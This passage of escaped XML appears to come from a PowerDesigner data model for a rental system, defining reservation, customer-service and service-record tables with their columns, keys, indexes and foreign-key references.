Id=&quot;o72&quot;&gt;&lt;a:ObjectID&gt;A21CAE64-20B2-4B98-8698-99D2E1978133&lt;/a:ObjectID&gt;&lt;a:Name&gt;身份证号&lt;/a:Name&gt;&lt;a:Code&gt;RenterIDNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618380776&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;32574FCE-7D54-4D3D-AA98-C83909852F7A&#125;DAT 1618333034ORG &#123;4AFE59F8-46B5-4D94-9E36-D1C0C6A93550&#125;,&#123;D4FD4412-8743-4AEA-B773-42465813A721&#125;DAT 1618325546ATT PIDTFATT PRIMATT NAMEATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;VARCHAR(18)&lt;/a:DataType&gt;&lt;a:Length&gt;18&lt;/a:Length&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o73&quot;&gt;&lt;a:ObjectID&gt;B098631A-3926-43BF-B712-083FEAD489F6&lt;/a:ObjectID&gt;&lt;a:Name&gt;房屋编号&lt;/a:Name&gt;&lt;a:Code&gt;RoomNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618398299&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;CA11FFF8-714B-4053-A468-D09353A7E3FA&#125;DAT 1618333034ATT PRIMATT CODEATT DTTP&lt;/a:History&gt;&lt;a:DataType&gt;INT4&lt;/a:DataType&gt;&lt;a:Length&gt;4&lt;/a:Length&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o74&quot;&gt;&lt;a:ObjectID&gt;0856035C-63AB-4542-9F70-FF1713DDCF39&lt;/a:ObjectID&gt;&lt;a:Name&gt;预定时间&lt;/a:Name&gt;&lt;a:Code&gt;ReserveTime&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333167&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;5394A779-DCBE-4DA7-8C19-0CD992008F23&#125;DAT 1618333034ATT PRIMATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;DATE&lt;/a:DataType&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;/c:Columns&gt;&lt;c:Keys&gt;&lt;o:Key Id=&quot;o75&quot;&gt;&lt;a:ObjectID&gt;2DCBA8A1-A76D-412D-9D0E-73FAFD654FA2&lt;/a:ObjectID&gt;&lt;a:Name&gt;Identifier_1&lt;/a:Name&gt;&lt;a:Code&gt;Identifier_1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618381164&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;A0CECD01-9346-465F-BCE4-007383CC147F&#125;DAT 1618333034INS COLNCOL &#123;32574FCE-7D54-4D3D-AA98-C83909852F7A&#125;INS COLNCOL &#123;CA11FFF8-714B-4053-A468-D09353A7E3FA&#125;INS COLNCOL &#123;5394A779-DCBE-4DA7-8C19-0CD992008F23&#125;REM COLNCOL &#123;5394A779-DCBE-4DA7-8C19-0CD992008F23&#125;REM COLNCOL &#123;CA11FFF8-714B-4053-A468-D09353A7E3FA&#125;REM COLNCOL &#123;32574FCE-7D54-4D3D-AA98-C83909852F7A&#125;REM COLNCOL &#123;D9D28149-7D20-4BCC-920E-5B8F49373C8E&#125;INS COLNCOL &#123;D9D28149-7D20-4BCC-920E-5B8F49373C8E&#125;&lt;/a:History&gt;&lt;c:Key.Columns&gt;&lt;o:Column Ref=&quot;o71&quot;/&gt;&lt;/c:Key.Columns&gt;&lt;/o:Key&gt;&lt;/c:Keys&gt;&lt;c:Indexes&gt;&lt;o:Index Id=&quot;o76&quot;&gt;&lt;a:ObjectID&gt;E74D6B5A-5852-4CAE-91D4-60A0CFEBE82E&lt;/a:ObjectID&gt;&lt;a:Name&gt;预定_PK&lt;/a:Name&gt;&lt;a:Code&gt;预定_PK&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618381164&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:Unique&gt;1&lt;/a:Unique&gt;&lt;c:LinkedObject&gt;&lt;o:Key Ref=&quot;o75&quot;/&gt;&lt;/c:LinkedObject&gt;&lt;c:IndexColumns&gt;&lt;o:IndexColumn Id=&quot;o77&quot;&gt;&lt;a:ObjectID&gt;5E8EB368-E413-4738-B3D8-DFC0F299E7B2&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618381138&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618381164&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Column&gt;&lt;o:Column Ref=&quot;o71&quot;/&gt;&lt;/c:Column&gt;&lt;/o:IndexColumn&gt;&lt;/c:IndexColumns&gt;&lt;/o:Index&gt;&lt;o:Index Id=&quot;o78&quot;&gt;&lt;a:ObjectID&gt;9626D402-B32F-4D0C-B610-EA927AF35E1B&lt;/a:ObjectID&gt;&lt;a:Name&gt;预定2_FK&lt;/a:Name&gt;&lt;a:Code&gt;预定2_FK&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:LinkedObject&gt;&lt;o:Reference Ref=&quot;o18&quot;/&gt;&lt;/c:LinkedObject&gt;&lt;c:IndexColumns&gt;&lt;o:IndexColumn Id=&quot;o79&quot;&gt;&lt;a:ObjectID&gt;8A0F30EE-2E04-4497-9240-17CDD194441B&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Column&gt;&lt;o:Column Ref=&quot;o72&quot;/&gt;&lt;/c:Column&gt;&lt;/o:IndexColumn&gt;&lt;/c:IndexColumns&gt;&lt;/o:Index&gt;&lt;/c:Indexes&gt;&lt;c:PrimaryKey&gt;&lt;o:Key Ref=&quot;o75&quot;/&gt;&lt;/c:PrimaryKey&gt;&lt;/o:Table&gt;&lt;o:Table Id=&quot;o34&quot;&gt;&lt;a:ObjectID&gt;B4DD0EFC-93F8-48E1-9E4A-5B5B8B236D40&lt;/a:ObjectID&gt;&lt;a:Name&gt;客服&lt;/a:Name&gt;&lt;a:Code&gt;Server&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333835&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;3EE96128-127C-4EF1-8004-2C6243B2E0F9&#125;DAT 1618333034ATT CODE&lt;/a:History&gt;&lt;a:TotalSavingCurrency/&gt;&lt;c:Columns&gt;&lt;o:Column Id=&quot;o80&quot;&gt;&lt;a:ObjectID&gt;753FA710-6DAA-421F-8F78-F893228FDE81&lt;/a:ObjectID&gt;&lt;a:Name&gt;客服编号&lt;/a:Name&gt;&lt;a:Code&gt;ServeNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333835&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;36EF7BBC-F289-430C-B44B-C0A936C3C0B4&#125;DAT 1618333034ATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;SERIAL&lt;/a:DataType&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o81&quot;&gt;&lt;a:ObjectID&gt;14C85440-3861-4084-BFAD-828589AC4F82&lt;/a:ObjectID&gt;&lt;a:Name&gt;客服电话&lt;/a:Name&gt;&lt;a:Code&gt;ServeTel&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333835&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;4FB37813-890D-428A-A331-CA6909168468&#125;DAT 1618333034ATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;VARCHAR(11)&lt;/a:DataType&gt;&lt;a:Length&gt;11&lt;/a:Length&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o82&quot;&gt;&lt;a:ObjectID&gt;39A08C0E-4889-48C3-852E-2102129DEDF3&lt;/a:ObjectID&gt;&lt;a:Name&gt;客服姓名&lt;/a:Name&gt;&lt;a:Code&gt;ServerName&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333835&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;3FB39DC8-1826-4F69-8EC3-6C720DBCDC69&#125;DAT 1618333034ATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;VARCHAR(11)&lt;/a:DataType&gt;&lt;a:Length&gt;11&lt;/a:Length&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o83&quot;&gt;&lt;a:ObjectID&gt;3290F167-90D0-4D50-A403-9FC80F8A5B3B&lt;/a:ObjectID&gt;&lt;a:Name&gt;客服身份证号码&lt;/a:Name&gt;&lt;a:Code&gt;ServerIDNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333835&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;ABA4FE36-695B-4D60-ABD1-8E35E6CC6522&#125;DAT 1618333034ATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;CHAR(18)&lt;/a:DataType&gt;&lt;a:Length&gt;18&lt;/a:Length&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o84&quot;&gt;&lt;a:ObjectID&gt;604851AB-F448-475B-8A26-E62F7B040AD9&lt;/a:ObjectID&gt;&lt;a:Name&gt;客服评分&lt;/a:Name&gt;&lt;a:Code&gt;ServerAssess&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333835&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;EF8BE3C3-F5A9-4709-A79A-AB835A8CEA89&#125;DAT 1618333034ATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;INT4&lt;/a:DataType&gt;&lt;a:Length&gt;4&lt;/a:Length&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;/c:Columns&gt;&lt;c:Keys&gt;&lt;o:Key Id=&quot;o85&quot;&gt;&lt;a:ObjectID&gt;65D2B1D9-B608-4564-AC82-07113F8F340D&lt;/a:ObjectID&gt;&lt;a:Name&gt;Identifier_1&lt;/a:Name&gt;&lt;a:Code&gt;Identifier_1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333033&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;682DB99C-0B47-43E4-A316-7DA8787C2AB4&#125;DAT 1618333034&lt;/a:History&gt;&lt;c:Key.Columns&gt;&lt;o:Column Ref=&quot;o80&quot;/&gt;&lt;/c:Key.Columns&gt;&lt;/o:Key&gt;&lt;/c:Keys&gt;&lt;c:Indexes&gt;&lt;o:Index Id=&quot;o86&quot;&gt;&lt;a:ObjectID&gt;38BD5568-74C9-46CD-BD27-244D9A5B76ED&lt;/a:ObjectID&gt;&lt;a:Name&gt;客服_PK&lt;/a:Name&gt;&lt;a:Code&gt;客服_PK&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:Unique&gt;1&lt;/a:Unique&gt;&lt;c:LinkedObject&gt;&lt;o:Key Ref=&quot;o85&quot;/&gt;&lt;/c:LinkedObject&gt;&lt;c:IndexColumns&gt;&lt;o:IndexColumn Id=&quot;o87&quot;&gt;&lt;a:ObjectID&gt;AB5E40C3-C4CA-4229-A112-EBC1E73236E4&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Column&gt;&lt;o:Column Ref=&quot;o80&quot;/&gt;&lt;/c:Column&gt;&lt;/o:IndexColumn&gt;&lt;/c:IndexColumns&gt;&lt;/o:Index&gt;&lt;/c:Indexes&gt;&lt;c:PrimaryKey&gt;&lt;o:Key Ref=&quot;o85&quot;/&gt;&lt;/c:PrimaryKey&gt;&lt;/o:Table&gt;&lt;o:Table Id=&quot;o35&quot;&gt;&lt;a:ObjectID&gt;18FC086F-1412-4DEB-9076-A5863346CC8A&lt;/a:ObjectID&gt;&lt;a:Name&gt;服务记录&lt;/a:Name&gt;&lt;a:Code&gt;ServeRecord&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333772&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;A02981F1-E99C-4853-82A4-68F80C60BE5C&#125;DAT 1618333034ATT CODE&lt;/a:History&gt;&lt;a:TotalSavingCurrency/&gt;&lt;c:Columns&gt;&lt;o:Column Id=&quot;o88&quot;&gt;&lt;a:ObjectID&gt;D9E97FB7-BE17-455C-B2C5-D952503805BB&lt;/a:ObjectID&gt;&lt;a:Name&gt;服务记录号&lt;/a:Name&gt;&lt;a:Code&gt;ServeNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333716&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;B8101468-78DB-436E-9CC8-5F21E6DFE632&#125;DAT 1618333034ATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;SERIAL&lt;/a:DataType&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o89&quot;&gt;&lt;a:ObjectID&gt;4FCB6115-F577-41BD-A23D-8C71204E12EB&lt;/a:ObjectID&gt;&lt;a:Name&gt;客服编号&lt;/a:Name&gt;&lt;a:Code&gt;ServerNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333716&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;15F83878-45E1-4A8C-9EA5-CBCD3C985D9E&#125;DAT 1618333034ATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;INT4&lt;/a:DataType&gt;&lt;a:Length&gt;4&lt;/a:Length&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;o:Column Id=&quot;o90&quot;&gt;&lt;a:ObjectID&gt;53B0987A-6915-4848-B883-75D111636FE6&lt;/a:ObjectID&gt;&lt;a:Name&gt;身份证&lt;/a:Name&gt;&lt;a:Code&gt;RenterIDNum&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333716&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;7C58CD07-13DC-4822-A16C-E7B816E13B1C&#125;DAT 1618333034ATT CODE&lt;/a:History&gt;&lt;a:DataType&gt;VARCHAR(18)&lt;/a:DataType&gt;&lt;a:Length&gt;18&lt;/a:Length&gt;&lt;a:Column.Mandatory&gt;1&lt;/a:Column.Mandatory&gt;&lt;/o:Column&gt;&lt;/c:Columns&gt;&lt;c:Keys&gt;&lt;o:Key Id=&quot;o91&quot;&gt;&lt;a:ObjectID&gt;67E6515F-6B8C-48D6-9DF8-4B275F99E7F8&lt;/a:ObjectID&gt;&lt;a:Name&gt;Identifier_1&lt;/a:Name&gt;&lt;a:Code&gt;Identifier_1&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333033&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;4E0E15F7-DE20-4A32-9E88-937D02B93191&#125;DAT 1618333034&lt;/a:History&gt;&lt;c:Key.Columns&gt;&lt;o:Column Ref=&quot;o88&quot;/&gt;&lt;/c:Key.Columns&gt;&lt;/o:Key&gt;&lt;/c:Keys&gt;&lt;c:Indexes&gt;&lt;o:Index Id=&quot;o92&quot;&gt;&lt;a:ObjectID&gt;BC5E025E-FEA3-4EF0-9B56-D1F99E8291A7&lt;/a:ObjectID&gt;&lt;a:Name&gt;服务记录_PK&lt;/a:Name&gt;&lt;a:Code&gt;服务记录_PK&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:Unique&gt;1&lt;/a:Unique&gt;&lt;c:LinkedObject&gt;&lt;o:Key Ref=&quot;o91&quot;/&gt;&lt;/c:LinkedObject&gt;&lt;c:IndexColumns&gt;&lt;o:IndexColumn Id=&quot;o93&quot;&gt;&lt;a:ObjectID&gt;BB117A18-80EA-4FC3-880D-3A71D5DD2301&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Column&gt;&lt;o:Column Ref=&quot;o88&quot;/&gt;&lt;/c:Column&gt;&lt;/o:IndexColumn&gt;&lt;/c:IndexColumns&gt;&lt;/o:Index&gt;&lt;o:Index Id=&quot;o94&quot;&gt;&lt;a:ObjectID&gt;7C5ABE13-C67E-445C-9AF0-665FF73C6048&lt;/a:ObjectID&gt;&lt;a:Name&gt;接听_FK&lt;/a:Name&gt;&lt;a:Code&gt;接听_FK&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:LinkedObject&gt;&lt;o:Reference Ref=&quot;o30&quot;/&gt;&lt;/c:LinkedObject&gt;&lt;c:IndexColumns&gt;&lt;o:IndexColumn Id=&quot;o95&quot;&gt;&lt;a:ObjectID&gt;42FF6E6F-FC03-4F32-8028-9F269661361D&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Column&gt;&lt;o:Column Ref=&quot;o89&quot;/&gt;&lt;/c:Column&gt;&lt;/o:IndexColumn&gt;&lt;/c:IndexColumns&gt;&lt;/o:Index&gt;&lt;o:Index Id=&quot;o96&quot;&gt;&lt;a:ObjectID&gt;9F7454A0-EF0F-4F15-84C3-AAC7554B1523&lt;/a:ObjectID&gt;&lt;a:Name&gt;联系_FK&lt;/a:Name&gt;&lt;a:Code&gt;联系_FK&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:LinkedObject&gt;&lt;o:Reference Ref=&quot;o33&quot;/&gt;&lt;/c:LinkedObject&gt;&lt;c:IndexColumns&gt;&lt;o:IndexColumn Id=&quot;o97&quot;&gt;&lt;a:ObjectID&gt;125CD27F-C4EA-4D5B-A4EB-1F182CE3F599&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618333034&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333034&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;c:Column&gt;&lt;o:Column Ref=&quot;o90&quot;/&gt;&lt;/c:Column&gt;&lt;/o:IndexColumn&gt;&lt;/c:IndexColumns&gt;&lt;/o:Index&gt;&lt;/c:Indexes&gt;&lt;c:PrimaryKey&gt;&lt;o:Key Ref=&quot;o91&quot;/&gt;&lt;/c:PrimaryKey&gt;&lt;/o:Table&gt;&lt;/c:Tables&gt;&lt;c:References&gt;&lt;o:Reference Id=&quot;o9&quot;&gt;&lt;a:ObjectID&gt;6A92FC1F-7A1A-4931-AE9D-9638065DC131&lt;/a:ObjectID&gt;&lt;a:Name&gt;租用&lt;/a:Name&gt;&lt;a:Code&gt;RentOne&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333944&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;BC44AF96-72CB-45FF-BC4A-8E230753DEDA&#125;DAT 1618333034ORG &#123;40788EEB-C543-4C66-8BC9-4C0CE4D0A1B2&#125;DAT 1618325546ATT CODEATT NAME&lt;/a:History&gt;&lt;a:Cardinality&gt;0..*&lt;/a:Cardinality&gt;&lt;a:UpdateConstraint&gt;1&lt;/a:UpdateConstraint&gt;&lt;a:DeleteConstraint&gt;1&lt;/a:DeleteConstraint&gt;&lt;c:ParentTable&gt;&lt;o:Table Ref=&quot;o21&quot;/&gt;&lt;/c:ParentTable&gt;&lt;c:ChildTable&gt;&lt;o:Table Ref=&quot;o24&quot;/&gt;&lt;/c:ChildTable&gt;&lt;c:ParentKey&gt;&lt;o:Key Ref=&quot;o39&quot;/&gt;&lt;/c:ParentKey&gt;&lt;c:Joins&gt;&lt;o:ReferenceJoin Id=&quot;o98&quot;&gt;&lt;a:ObjectID&gt;665B74FA-9B87-4F8F-A272-7F773396C443&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333033&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;80E06EDF-CE87-4EB0-AFAD-03BB529F5714&#125;DAT 1618333034&lt;/a:History&gt;&lt;c:Object1&gt;&lt;o:Column Ref=&quot;o36&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:Column Ref=&quot;o60&quot;/&gt;&lt;/c:Object2&gt;&lt;/o:ReferenceJoin&gt;&lt;/c:Joins&gt;&lt;/o:Reference&gt;&lt;o:Reference Id=&quot;o12&quot;&gt;&lt;a:ObjectID&gt;A1CCA15C-224B-4D9C-88ED-1E29C24BCD80&lt;/a:ObjectID&gt;&lt;a:Name&gt;租用&lt;/a:Name&gt;&lt;a:Code&gt;RentTwo&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333925&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;1F496893-9A00-4C05-A3B2-683210DB4DD3&#125;DAT 1618333034ORG &#123;B74ABDAE-7F8E-4DAA-BECE-67686B380E54&#125;DAT 1618325546ATT CODEATT NAME&lt;/a:History&gt;&lt;a:Cardinality&gt;0..*&lt;/a:Cardinality&gt;&lt;a:UpdateConstraint&gt;1&lt;/a:UpdateConstraint&gt;&lt;a:DeleteConstraint&gt;1&lt;/a:DeleteConstraint&gt;&lt;c:ParentTable&gt;&lt;o:Table Ref=&quot;o22&quot;/&gt;&lt;/c:ParentTable&gt;&lt;c:ChildTable&gt;&lt;o:Table Ref=&quot;o24&quot;/&gt;&lt;/c:ChildTable&gt;&lt;c:ParentKey&gt;&lt;o:Key Ref=&quot;o48&quot;/&gt;&lt;/c:ParentKey&gt;&lt;c:Joins&gt;&lt;o:ReferenceJoin Id=&quot;o99&quot;&gt;&lt;a:ObjectID&gt;02AC7333-70BD-4C58-97F5-280B23E9FB3B&lt;/a:ObjectID&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333033&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;1D75CD41-4233-4EC7-B565-51AB9EE4EDB0&#125;DAT 1618333034&lt;/a:History&gt;&lt;c:Object1&gt;&lt;o:Column Ref=&quot;o42&quot;/&gt;&lt;/c:Object1&gt;&lt;c:Object2&gt;&lt;o:Column Ref=&quot;o61&quot;/&gt;&lt;/c:Object2&gt;&lt;/o:ReferenceJoin&gt;&lt;/c:Joins&gt;&lt;/o:Reference&gt;&lt;o:Reference Id=&quot;o15&quot;&gt;&lt;a:ObjectID&gt;2AF26466-E1A0-4CFF-A1C2-5FDE88B1430F&lt;/a:ObjectID&gt;&lt;a:Name&gt;拥有&lt;/a:Name&gt;&lt;a:Code&gt;Possess&lt;/a:Code&gt;&lt;a:CreationDate&gt;1618333033&lt;/a:CreationDate&gt;&lt;a:Creator&gt;LEGION&lt;/a:Creator&gt;&lt;a:ModificationDate&gt;1618333912&lt;/a:ModificationDate&gt;&lt;a:Modifier&gt;LEGION&lt;/a:Modifier&gt;&lt;a:History&gt;ORG &#123;0017D355-0272-4462-BC40-797D267ABA2E&#125;DAT 1618333034ORG &#123;EAB9668A-ADFE-4355-822B-2AAAEBE5E1E1&#125;DAT 1618325546ATT CODE&lt;/a:History&gt;&lt;a:Cardinality&gt;0..*&lt;/a:Cardinality&gt;&lt;a:UpdateConstraint&gt;1&lt;/a:UpdateConstraint&gt;&lt;a:DeleteConstraint&gt;1&lt;/a:DeleteConstraint&gt;&lt;c:ParentTable&gt;&lt;o:Table 